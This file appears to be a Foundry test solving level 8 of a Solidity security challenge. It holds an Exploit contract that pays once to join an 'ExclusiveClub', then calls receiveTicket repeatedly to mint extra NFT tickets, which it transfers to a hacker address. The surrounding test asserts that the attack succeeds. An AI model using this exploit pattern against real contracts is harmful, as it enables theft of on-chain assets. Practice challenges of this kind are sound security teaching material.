// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import { ExclusiveClub } from "../src/8_TransientTrouble.sol";
import { TransientTroubleHelper } from "../test_helper/8_TransientTroubleSetup.sol";
import "forge-std/Test.sol";
import "../mocks/NFT.sol";

contract Exploit {
    ExclusiveClub daClub;
    NFT ticket;

    constructor(ExclusiveClub _daClub, NFT _ticket) payable {
        daClub = _daClub;
        ticket = _ticket;
    }

    function exploit() external {
        daClub.externalJoinClub{value: 0.1 ether}();
        daClub.receiveTicket();
        daClub.receiveTicket();

        ticket.transferFrom(address(this), address(0xBAD), 0);
        ticket.transferFrom(address(this), address(0xBAD), 1);
        ticket.transferFrom(address(this), address(0xBAD), 2);
    }
}

contract TransientTrouble is Test {

    NFT public ticket;
    ExclusiveClub daClub;


    function setUp() public {
        TransientTroubleHelper dontpeak = new TransientTroubleHelper();
        daClub = dontpeak.deployed();
        ticket = dontpeak.ticket();
    }


    function test_GetThisPassing_8() public {

        address hacker = address(0xBAD);

        vm.startPrank(hacker);
        Exploit e = new Exploit{value: 0.1 ether}(daClub, ticket);
        e.exploit();
        
        vm.stopPrank();

        assertGt(ticket.balanceOf(hacker), 2);
    }


}
